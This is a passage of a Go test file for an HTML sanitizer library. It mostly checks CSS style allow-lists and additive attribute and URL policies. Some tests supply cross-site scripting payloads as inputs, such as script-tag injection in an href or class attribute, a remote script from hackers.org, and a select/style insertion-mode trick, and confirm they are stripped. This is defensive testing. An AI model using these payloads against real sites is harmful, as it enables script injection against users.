			expected: `<div style="outline: 2px dashed blue"></div><div ` +
				`style="outline: initial"></div>`,
		},
		{
			in:       `<div style="outline-color: blue;"></div>`,
			expected: `<div style="outline-color: blue"></div>`,
		},
		{
			in: `<div style="outline-offset: 2px;"></div><div ` +
				`style="outline-offset: initial;"></div>`,
			expected: `<div style="outline-offset: 2px"></div><div ` +
				`style="outline-offset: initial"></div>`,
		},
		{
			in:       `<div style="outline-style: dashed;"></div>`,
			expected: `<div style="outline-style: dashed"></div>`,
		},
		{
			in:       `<div style="outline-width: thick;"></div>`,
			expected: `<div style="outline-width: thick"></div>`,
		},
		{
			in:       `<div style="overflow: scroll;"></div>`,
			expected: `<div style="overflow: scroll"></div>`,
		},
		{
			in:       `<div style="overflow-x: scroll;"></div>`,
			expected: `<div style="overflow-x: scroll"></div>`,
		},
		{
			in:       `<div style="overflow-y: scroll;"></div>`,
			expected: `<div style="overflow-y: scroll"></div>`,
		},
		{
			in:       `<div style="overflow-wrap: anywhere;"></div>`,
			expected: `<div style="overflow-wrap: anywhere"></div>`,
		},
		{
			in:       `<div style="orphans: 2;"></div>`,
			expected: `<div style="orphans: 2"></div>`,
		},
		{
			in:       `<div style="padding: 55px;"></div>`,
			expected: `<div style="padding: 55px"></div>`,
		},
		{
			in: `<div style="padding-bottom: 55px;"></div><div style` +
				`="padding-bottom: initial;"></div>`,
			expected: `<div style="padding-bottom: 55px"></div><div style=` +
				`"padding-bottom: initial"></div>`,
		},
		{
			in:       `<div style="padding-left: 55px;"></div>`,
			expected: `<div style="padding-left: 55px"></div>`,
		},
		{
			in:       `<div style="padding-right: 55px;"></div>`,
			expected: `<div style="padding-right: 55px"></div>`,
		},
		{
			in:       `<div style="padding-top: 55px;"></div>`,
			expected: `<div style="padding-top: 55px"></div>`,
		},
		{
			in:       `<div style="page-break-after: always;"></div>`,
			expected: `<div style="page-break-after: always"></div>`,
		},
		{
			in:       `<div style="page-break-before: always;"></div>`,
			expected: `<div style="page-break-before: always"></div>`,
		},
		{
			in:       `<div style="page-break-inside: avoid;"></div>`,
			expected: `<div style="page-break-inside: avoid"></div>`,
		},
		{
			in: `<div style="perspective: 100px;"></div><div style=` +
				`"perspective: none;"></div>`,
			expected: `<div style="perspective: 100px"></div><div style=` +
				`"perspective: none"></div>`,
		},
		{
			in:       `<div style="perspective-origin: left;"></div>`,
			expected: `<div style="perspective-origin: left"></div>`,
		},
		{
			in:       `<div style="pointer-events: auto;"></div>`,
			expected: `<div style="pointer-events: auto"></div>`,
		},
		{
			in:       `<div style="position: absolute;"></div>`,
			expected: `<div style="position: absolute"></div>`,
		},
		{
			in:       `<div style="quotes: '‹' '›';"></div>`,
			expected: `<div style="quotes: &#39;‹&#39; &#39;›&#39;"></div>`,
		},
		{
			in:       `<div style="resize: both;"></div>`,
			expected: `<div style="resize: both"></div>`,
		},
		{
			in:       `<div style="right: 10px;"></div>`,
			expected: `<div style="right: 10px"></div>`,
		},
		{
			in:       `<div style="scroll-behavior: smooth;"></div>`,
			expected: `<div style="scroll-behavior: smooth"></div>`,
		},
		{
			in: `<div style="tab-size: 16;"></div><div style="tab-size:` +
				` initial;"></div>`,
			expected: `<div style="tab-size: 16"></div><div style="tab-size:` +
				` initial"></div>`,
		},
		{
			in:       `<div style="table-layout: fixed;"></div>`,
			expected: `<div style="table-layout: fixed"></div>`,
		},
		{
			in:       `<div style="text-align: justify;"></div>`,
			expected: `<div style="text-align: justify"></div>`,
		},
		{
			in:       `<div style="text-align-last: justify;"></div>`,
			expected: `<div style="text-align-last: justify"></div>`,
		},
		{
			in: `<div style="text-combine-upright: none;"></div><div` +
				` style="text-combine-upright: digits 2"></div>`,
			expected: `<div style="text-combine-upright: none"></div><div ` +
				`style="text-combine-upright: digits 2"></div>`,
		},
		{
			in: `<div style="text-decoration: underline underline;">` +
				`</div><div style="text-decoration: initial"></div>`,
			expected: `<div style="text-decoration: underline underline">` +
				`</div><div style="text-decoration: initial"></div>`,
		},
		{
			in:       `<div style="text-decoration-color: red;"></div>`,
			expected: `<div style="text-decoration-color: red"></div>`,
		},
		{
			in: `<div style="text-decoration-line: underline ` +
				`underline;"></div>`,
			expected: `<div style="text-decoration-line: underline ` +
				`underline"></div>`,
		},
		{
			in:       `<div style="text-decoration-style: solid;"></div>`,
			expected: `<div style="text-decoration-style: solid"></div>`,
		},
		{
			in: `<div style="text-indent: 30%;"></div><div style=` +
				`"text-indent: initial"></div>`,
			expected: `<div style="text-indent: 30%"></div><div style=` +
				`"text-indent: initial"></div>`,
		},
		{
			in:       `<div style="text-orientation: mixed"></div>`,
			expected: `<div style="text-orientation: mixed"></div>`,
		},
		{
			in:       `<div style="text-justify: inter-word;"></div>`,
			expected: `<div style="text-justify: inter-word"></div>`,
		},
		{
			in: `<div style="text-overflow: ellipsis;"></div><div ` +
				`style="text-overflow: 'something'"></div>`,
			expected: `<div style="text-overflow: ellipsis"></div><div ` +
				`style="text-overflow: &#39;something&#39;"></div>`,
		},
		{
			in:       `<div style="text-shadow: 2px 2px #ff0000;"></div>`,
			expected: `<div style="text-shadow: 2px 2px #ff0000"></div>`,
		},
		{
			in:       `<div style="text-transform: uppercase;"></div>`,
			expected: `<div style="text-transform: uppercase"></div>`,
		},
		{
			in:       `<div style="top: 150px;"></div>`,
			expected: `<div style="top: 150px"></div>`,
		},
		{
			in: `<div style="transform: scaleY(1.5);"></div><div ` +
				`style="transform: perspective(20px);"></div>`,
			expected: `<div style="transform: scaleY(1.5)"></div><div ` +
				`style="transform: perspective(20px)"></div>`,
		},
		{
			in:       `<div style="transform-origin: 40% 40%;"></div>`,
			expected: `<div style="transform-origin: 40% 40%"></div>`,
		},
		{
			in:       `<div style="transform-style: preserve-3d;"></div>`,
			expected: `<div style="transform-style: preserve-3d"></div>`,
		},
		{
			in:       `<div style="transition: width 2s;"></div>`,
			expected: `<div style="transition: width 2s"></div>`,
		},
		{
			in: `<div style="transition-delay: 2s;"></div><div ` +
				`style="transition-delay: initial;"></div>`,
			expected: `<div style="transition-delay: 2s"></div><div ` +
				`style="transition-delay: initial"></div>`,
		},
		{
			in: `<div style="transition-duration: 2s;"></div><div ` +
				`style="transition-duration: initial;"></div>`,
			expected: `<div style="transition-duration: 2s"></div><div ` +
				`style="transition-duration: initial"></div>`,
		},
		{
			in: `<div style="transition-property: width;"></div><div ` +
				`style="transition-property: initial;"></div>`,
			expected: `<div style="transition-property: width"></div><div ` +
				`style="transition-property: initial"></div>`,
		},
		{
			in: `<div style="transition-timing-function: linear;">` +
				`</div>`,
			expected: `<div style="transition-timing-function: linear">` +
				`</div>`,
		},
		{
			in:       `<div style="unicode-bidi: bidi-override;"></div>`,
			expected: `<div style="unicode-bidi: bidi-override"></div>`,
		},
		{
			in:       `<div style="user-select: none;"></div>`,
			expected: `<div style="user-select: none"></div>`,
		},
		{
			in:       `<div style="vertical-align: text-bottom;"></div>`,
			expected: `<div style="vertical-align: text-bottom"></div>`,
		},
		{
			in:       `<div style="visibility: visible;"></div>`,
			expected: `<div style="visibility: visible"></div>`,
		},
		{
			in:       `<div style="white-space: normal;"></div>`,
			expected: `<div style="white-space: normal"></div>`,
		},
		{
			in: `<div style="width: 130px;"></div><div style="width: ` +
				`auto;"></div>`,
			expected: `<div style="width: 130px"></div><div style="width: ` +
				`auto"></div>`,
		},
		{
			in:       `<div style="word-break: break-all;"></div>`,
			expected: `<div style="word-break: break-all"></div>`,
		},
		{
			in: `<div style="word-spacing: 30px;"></div><div style=` +
				`"word-spacing: normal"></div>`,
			expected: `<div style="word-spacing: 30px"></div><div style=` +
				`"word-spacing: normal"></div>`,
		},
		{
			in:       `<div style="word-wrap: break-word;"></div>`,
			expected: `<div style="word-wrap: break-word"></div>`,
		},
		{
			in:       `<div style="writing-mode: vertical-rl;"></div>`,
			expected: `<div style="writing-mode: vertical-rl"></div>`,
		},
		{
			in: `<div style="z-index: -1;"></div><div style="z-index:` +
				` auto;"></div>`,
			expected: `<div style="z-index: -1"></div><div style="z-index:` +
				` auto"></div>`,
		},
	}

	p := UGCPolicy()
	p.AllowStyles("nonexistentStyle", "align-content", "align-items",
		"align-self", "all", "animation", "animation-delay",
		"animation-direction", "animation-duration", "animation-fill-mode",
		"animation-iteration-count", "animation-name", "animation-play-state",
		"animation-timing-function", "backface-visibility", "background",
		"background-attachment", "background-blend-mode", "background-clip",
		"background-color", "background-image", "background-origin",
		"background-position", "background-repeat", "background-size",
		"border", "border-bottom", "border-bottom-color",
		"border-bottom-left-radius", "border-bottom-right-radius",
		"border-bottom-style", "border-bottom-width", "border-collapse",
		"border-color", "border-image", "border-image-outset",
		"border-image-repeat", "border-image-slice", "border-image-source",
		"border-image-width", "border-left", "border-left-color",
		"border-left-style", "border-left-width", "border-radius",
		"border-right", "border-right-color", "border-right-style",
		"border-right-width", "border-spacing", "border-style", "border-top",
		"border-top-color", "border-top-left-radius",
		"border-top-right-radius", "border-top-style", "border-top-width",
		"border-width", "bottom", "box-decoration-break", "box-shadow",
		"box-sizing", "break-after", "break-before", "break-inside",
		"caption-side", "caret-color", "clear", "clip", "color",
		"column-count", "column-fill", "column-gap", "column-rule",
		"column-rule-color", "column-rule-style", "column-rule-width",
		"column-span", "column-width", "columns", "cursor", "direction",
		"display", "empty-cells", "filter", "flex", "flex-basis",
		"flex-direction", "flex-flow", "flex-grow", "flex-shrink",
		"flex-wrap", "float", "font", "font-family", "font-kerning",
		"font-language-override", "font-size", "font-size-adjust",
		"font-stretch", "font-style", "font-synthesis", "font-variant",
		"font-variant-caps", "font-variant-position", "font-weight", "grid",
		"grid-area", "grid-auto-columns", "grid-auto-flow", "grid-auto-rows",
		"grid-column", "grid-column-end", "grid-column-gap",
		"grid-column-start", "grid-gap", "grid-row", "grid-row-end",
		"grid-row-gap", "grid-row-start", "grid-template",
		"grid-template-areas", "grid-template-columns", "grid-template-rows",
		"hanging-punctuation", "height", "hyphens", "image-rendering",
		"isolation", "justify-content", "left", "letter-spacing", "line-break",
		"line-height", "list-style", "list-style-image", "list-style-position",
		"list-style-type", "margin", "margin-bottom", "margin-left",
		"margin-right", "margin-top", "max-height", "max-width", "min-height",
		"min-width", "mix-blend-mode", "object-fit", "object-position",
		"opacity", "order", "orphans", "outline", "outline-color",
		"outline-offset", "outline-style", "outline-width", "overflow",
		"overflow-wrap", "overflow-x", "overflow-y", "padding",
		"padding-bottom", "padding-left", "padding-right", "padding-top",
		"page-break-after", "page-break-before", "page-break-inside",
		"perspective", "perspective-origin", "pointer-events", "position",
		"quotes", "resize", "right", "scroll-behavior", "tab-size",
		"table-layout", "text-align", "text-align-last",
		"text-combine-upright", "text-decoration", "text-decoration-color",
		"text-decoration-line", "text-decoration-style", "text-indent",
		"text-justify", "text-orientation", "text-overflow", "text-shadow",
		"text-transform", "top", "transform", "transform-origin",
		"transform-style", "transition", "transition-delay",
		"transition-duration", "transition-property",
		"transition-timing-function", "unicode-bidi", "user-select",
		"vertical-align", "visibility", "white-space", "widows", "width",
		"word-break", "word-spacing", "word-wrap", "writing-mode",
		"z-index").Globally()
	p.RequireParseableURLs(true)

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestUnicodePoints(t *testing.T) {

	tests := []test{
		{
			in:       `<div style="color: \72 ed;"></div>`,
			expected: `<div style="color: \72 ed"></div>`,
		},
		{
			in:       `<div style="color: \0072 ed;"></div>`,
			expected: `<div style="color: \0072 ed"></div>`,
		},
		{
			in:       `<div style="color: \000072 ed;"></div>`,
			expected: `<div style="color: \000072 ed"></div>`,
		},
		{
			in:       `<div style="color: \000072ed;"></div>`,
			expected: `<div style="color: \000072ed"></div>`,
		},
		{
			in:       `<div style="color: \100072ed;"></div>`,
			expected: `<div></div>`,
		},
	}

	p := UGCPolicy()
	p.AllowStyles("color").Globally()
	p.RequireParseableURLs(true)

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestMatchingHandler(t *testing.T) {
	truthHandler := func(value string) bool {
		return true
	}

	tests := []test{
		{
			in:       `<div style="color: invalidValue"></div>`,
			expected: `<div style="color: invalidValue"></div>`,
		},
	}

	p := UGCPolicy()
	p.AllowStyles("color").MatchingHandler(truthHandler).Globally()
	p.RequireParseableURLs(true)

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestStyleBlockHandler(t *testing.T) {
	truthHandler := func(value string) bool {
		return true
	}

	tests := []test{
		{
			in:       ``,
			expected: ``,
		},
	}

	p := UGCPolicy()
	p.AllowStyles("color").MatchingHandler(truthHandler).Globally()
	p.RequireParseableURLs(true)

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestAdditivePolicies(t *testing.T) {
	t.Run("AllowAttrs", func(t *testing.T) {
		p := NewPolicy()
		p.AllowAttrs("class").Matching(regexp.MustCompile("red")).OnElements("span")

		t.Run("red", func(t *testing.T) {
			tests := []test{
				{
					in:       `<span class="red">test</span>`,
					expected: `<span class="red">test</span>`,
				},
				{
					in:       `<span class="green">test</span>`,
					expected: `<span>test</span>`,
				},
				{
					in:       `<span class="blue">test</span>`,
					expected: `<span>test</span>`,
				},
			}

			for ii, tt := range tests {
				out := p.Sanitize(tt.in)
				if out != tt.expected {
					t.Errorf(
						"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
						ii,
						tt.in,
						out,
						tt.expected,
					)
				}
			}
		})

		p.AllowAttrs("class").Matching(regexp.MustCompile("green")).OnElements("span")

		t.Run("green", func(t *testing.T) {
			tests := []test{
				{
					in:       `<span class="red">test</span>`,
					expected: `<span class="red">test</span>`,
				},
				{
					in:       `<span class="green">test</span>`,
					expected: `<span class="green">test</span>`,
				},
				{
					in:       `<span class="blue">test</span>`,
					expected: `<span>test</span>`,
				},
			}

			for ii, tt := range tests {
				out := p.Sanitize(tt.in)
				if out != tt.expected {
					t.Errorf(
						"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
						ii,
						tt.in,
						out,
						tt.expected,
					)
				}
			}
		})

		p.AllowAttrs("class").Matching(regexp.MustCompile("yellow")).OnElements("span")

		t.Run("yellow", func(t *testing.T) {
			tests := []test{
				{
					in:       `<span class="red">test</span>`,
					expected: `<span class="red">test</span>`,
				},
				{
					in:       `<span class="green">test</span>`,
					expected: `<span class="green">test</span>`,
				},
				{
					in:       `<span class="blue">test</span>`,
					expected: `<span>test</span>`,
				},
			}

			for ii, tt := range tests {
				out := p.Sanitize(tt.in)
				if out != tt.expected {
					t.Errorf(
						"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
						ii,
						tt.in,
						out,
						tt.expected,
					)
				}
			}
		})
	})

	t.Run("AllowStyles", func(t *testing.T) {
		p := NewPolicy()
		p.AllowAttrs("style").OnElements("span")
		p.AllowStyles("color").Matching(regexp.MustCompile("red")).OnElements("span")

		t.Run("red", func(t *testing.T) {
			tests := []test{
				{
					in:       `<span style="color: red">test</span>`,
					expected: `<span style="color: red">test</span>`,
				},
				{
					in:       `<span style="color: green">test</span>`,
					expected: `<span>test</span>`,
				},
				{
					in:       `<span style="color: blue">test</span>`,
					expected: `<span>test</span>`,
				},
			}

			for ii, tt := range tests {
				out := p.Sanitize(tt.in)
				if out != tt.expected {
					t.Errorf(
						"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
						ii,
						tt.in,
						out,
						tt.expected,
					)
				}
			}
		})

		p.AllowStyles("color").Matching(regexp.MustCompile("green")).OnElements("span")

		t.Run("green", func(t *testing.T) {
			tests := []test{
				{
					in:       `<span style="color: red">test</span>`,
					expected: `<span style="color: red">test</span>`,
				},
				{
					in:       `<span style="color: green">test</span>`,
					expected: `<span style="color: green">test</span>`,
				},
				{
					in:       `<span style="color: blue">test</span>`,
					expected: `<span>test</span>`,
				},
			}

			for ii, tt := range tests {
				out := p.Sanitize(tt.in)
				if out != tt.expected {
					t.Errorf(
						"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
						ii,
						tt.in,
						out,
						tt.expected,
					)
				}
			}
		})

		p.AllowStyles("color").Matching(regexp.MustCompile("yellow")).OnElements("span")

		t.Run("yellow", func(t *testing.T) {
			tests := []test{
				{
					in:       `<span style="color: red">test</span>`,
					expected: `<span style="color: red">test</span>`,
				},
				{
					in:       `<span style="color: green">test</span>`,
					expected: `<span style="color: green">test</span>`,
				},
				{
					in:       `<span style="color: blue">test</span>`,
					expected: `<span>test</span>`,
				},
			}

			for ii, tt := range tests {
				out := p.Sanitize(tt.in)
				if out != tt.expected {
					t.Errorf(
						"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
						ii,
						tt.in,
						out,
						tt.expected,
					)
				}
			}
		})
	})

	t.Run("AllowURLSchemeWithCustomPolicy", func(t *testing.T) {
		p := NewPolicy()
		p.AllowAttrs("href").OnElements("a")

		p.AllowURLSchemeWithCustomPolicy(
			"http",
			func(url *url.URL) bool {
				return url.Hostname() == "example.org"
			},
		)

		t.Run("example.org", func(t *testing.T) {
			tests := []test{
				{
					in:       `<a href="http://example.org/">test</a>`,
					expected: `<a href="http://example.org/">test</a>`,
				},
				{
					in:       `<a href="http://example2.org/">test</a>`,
					expected: `test`,
				},
				{
					in:       `<a href="http://example4.org/">test</a>`,
					expected: `test`,
				},
			}

			for ii, tt := range tests {
				out := p.Sanitize(tt.in)
				if out != tt.expected {
					t.Errorf(
						"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
						ii,
						tt.in,
						out,
						tt.expected,
					)
				}
			}
		})

		p.AllowURLSchemeWithCustomPolicy(
			"http",
			func(url *url.URL) bool {
				return url.Hostname() == "example2.org"
			},
		)

		t.Run("example2.org", func(t *testing.T) {
			tests := []test{
				{
					in:       `<a href="http://example.org/">test</a>`,
					expected: `<a href="http://example.org/">test</a>`,
				},
				{
					in:       `<a href="http://example2.org/">test</a>`,
					expected: `<a href="http://example2.org/">test</a>`,
				},
				{
					in:       `<a href="http://example4.org/">test</a>`,
					expected: `test`,
				},
			}

			for ii, tt := range tests {
				out := p.Sanitize(tt.in)
				if out != tt.expected {
					t.Errorf(
						"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
						ii,
						tt.in,
						out,
						tt.expected,
					)
				}
			}
		})

		p.AllowURLSchemeWithCustomPolicy(
			"http",
			func(url *url.URL) bool {
				return url.Hostname() == "example3.org"
			},
		)

		t.Run("example3.org", func(t *testing.T) {
			tests := []test{
				{
					in:       `<a href="http://example.org/">test</a>`,
					expected: `<a href="http://example.org/">test</a>`,
				},
				{
					in:       `<a href="http://example2.org/">test</a>`,
					expected: `<a href="http://example2.org/">test</a>`,
				},
				{
					in:       `<a href="http://example4.org/">test</a>`,
					expected: `test`,
				},
			}

			for ii, tt := range tests {
				out := p.Sanitize(tt.in)
				if out != tt.expected {
					t.Errorf(
						"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
						ii,
						tt.in,
						out,
						tt.expected,
					)
				}
			}
		})
	})
}

func TestHrefSanitization(t *testing.T) {
	tests := []test{
		{
			in:       `abc<a href="https://abc&quot;&gt;<script&gt;alert(1)<&#x2f;script/">CLICK`,
			expected: `abc<a href="https://abc&#34;&gt;&lt;script&gt;alert(1)&lt;/script/" rel="nofollow">CLICK`,
		},
		{
			in:       `<a href="https://abc&quot;&gt;<script&gt;alert(1)<&#x2f;script/">`,
			expected: `<a href="https://abc&#34;&gt;&lt;script&gt;alert(1)&lt;/script/" rel="nofollow">`,
		},
	}

	p := UGCPolicy()

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestInsertionModeSanitization(t *testing.T) {
	tests := []test{
		{
			in:       `<select><option><style><script>alert(1)</script>`,
			expected: `<select><option>`,
		},
	}

	p := UGCPolicy()
	p.AllowElements("select", "option", "style")

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestIssue3(t *testing.T) {
	// https://github.com/microcosm-cc/bluemonday/issues/3

	p := UGCPolicy()
	p.AllowStyling()

	tests := []test{
		{
			in:       `Hello <span class="foo bar bash">there</span> world.`,
			expected: `Hello <span class="foo bar bash">there</span> world.`,
		},
		{
			in:       `Hello <span class="javascript:alert(123)">there</span> world.`,
			expected: `Hello <span>there</span> world.`,
		},
		{
			in:       `Hello <span class="><script src="http://hackers.org/XSS.js"></script>">there</span> world.`,
			expected: `Hello <span>&#34;&gt;there</span> world.`,
		},
		{
			in:       `Hello <span class="><script src='http://hackers.org/XSS.js'></script>">there</span> world.`,
			expected: `Hello <span>there</span> world.`,
		},
	}

	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}
func TestIssue9(t *testing.T) {

	p := UGCPolicy()
	p.AllowAttrs("class").Matching(SpaceSeparatedTokens).OnElements("div", "span")
	p.AllowAttrs("class", "name").Matching(SpaceSeparatedTokens).OnElements("a")
	p.AllowAttrs("rel").Matching(regexp.MustCompile(`^nofollow$`)).OnElements("a")
	p.AllowAttrs("aria-hidden").Matching(regexp.MustCompile(`^true$`)).OnElements("a")
	p.AllowDataURIImages()

	tt := test{
		in:       `<h2><a name="git-diff" class="anchor" href="#git-diff" rel="nofollow" aria-hidden="true"><span class="octicon octicon-link"></span></a>git diff</h2>`,
		expected: `<h2><a name="git-diff" class="anchor" href="#git-diff" rel="nofollow" aria-hidden="true"><span class="octicon octicon-link"></span></a>git diff</h2>`,
	}
	out := p.Sanitize(tt.in)
	if out != tt.expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			tt.in,
			out,
			tt.expected,
		)
	}

	tt = test{
		in:       `<h2><a name="git-diff" class="anchor" href="#git-diff" aria-hidden="true"><span class="octicon octicon-link"></span></a>git diff</h2>`,
		expected: `<h2><a name="git-diff" class="anchor" href="#git-diff" aria-hidden="true" rel="nofollow"><span class="octicon octicon-link"></span></a>git diff</h2>`,
	}
	out = p.Sanitize(tt.in)
	if out != tt.expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			tt.in,
			out,
			tt.expected,
		)
	}

	p.AddTargetBlankToFullyQualifiedLinks(true)

	tt = test{
		in:       `<h2><a name="git-diff" class="anchor" href="#git-diff" aria-hidden="true"><span class="octicon octicon-link"></span></a>git diff</h2>`,
		expected: `<h2><a name="git-diff" class="anchor" href="#git-diff" aria-hidden="true" rel="nofollow"><span class="octicon octicon-link"></span></a>git diff</h2>`,
	}
	out = p.Sanitize(tt.in)
	if out != tt.expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			tt.in,
			out,
			tt.expected,
		)
	}

	tt = test{
		in:       `<h2><a name="git-diff" class="anchor" href="https://github.com/shurcooL/github_flavored_markdown/blob/master/sanitize_test.go" aria-hidden="true"><span class="octicon octicon-link"></span></a>git diff</h2>`,
		expected: `<h2><a name="git-diff" class="anchor" href="https://github.com/shurcooL/github_flavored_markdown/blob/master/sanitize_test.go" aria-hidden="true" rel="nofollow noopener" target="_blank"><span class="octicon octicon-link"></span></a>git diff</h2>`,
	}
	out = p.Sanitize(tt.in)
	if out != tt.expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			tt.in,
			out,
			tt.expected,
		)
	}

	tt = test{
		in:       `<h2><a name="git-diff" class="anchor" href="https://github.com/shurcooL/github_flavored_markdown/blob/master/sanitize_test.go" aria-hidden="true" target="namedwindow"><span class="octicon octicon-link"></span></a>git diff</h2>`,
		expected: `<h2><a name="git-diff" class="anchor" href="https://github.com/shurcooL/github_flavored_markdown/blob/master/sanitize_test.go" aria-hidden="true" rel="nofollow noopener" target="_blank"><span class="octicon octicon-link"></span></a>git diff</h2>`,
	}
	out = p.Sanitize(tt.in)
	if out != tt.expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			tt.in,
			out,
			tt.expected,
		)
	}
}

func TestIssue18(t *testing.T) {
	p := UGCPolicy()

	p.AllowAttrs("color").OnElements("font")
	p.AllowElements("font")

	tt := test{
		in:       `<font face="Arial">No link here. <a href="http://link.com">link here</a>.</font> Should not be linked here.`,
		expected: `No link here. <a href="http://link.com" rel="nofollow">link here</a>. Should not be linked here.`,
	}
	out := p.Sanitize(tt.in)
	if out != tt.expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			tt.in,
			out,
			tt.expected)
	}
}

func TestIssue23(t *testing.T) {
	p := NewPolicy()
	p.SkipElementsContent("tag1", "tag2")
	input := `<tag1>cut<tag2></tag2>harm</tag1><tag1>123</tag1><tag2>234</tag2>`
	out := p.Sanitize(input)
	expected := ""
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}

	p = NewPolicy()
	p.SkipElementsContent("tag")
	p.AllowElements("p")
	input = `<tag>234<p>asd</p></tag>`
	out = p.Sanitize(input)
	expected = ""
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}

	p = NewPolicy()
	p.SkipElementsContent("tag")
	p.AllowElements("p", "br")
	input = `<tag>234<p>as<br/>d</p></tag>`
	out = p.Sanitize(input)
	expected = ""
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}
}

func TestIssue51(t *testing.T) {
	// Whitespace in URLs is permitted within HTML according to:
	// https://dev.w3.org/html5/spec-LC/urls.html#parsing-urls
	//
	// We were aggressively rejecting URLs that contained line feeds but these
	// are permitted.
	//
	// This test ensures that we do not regress that fix.
	p := NewPolicy()
	p.AllowImages()
	p.AllowDataURIImages()

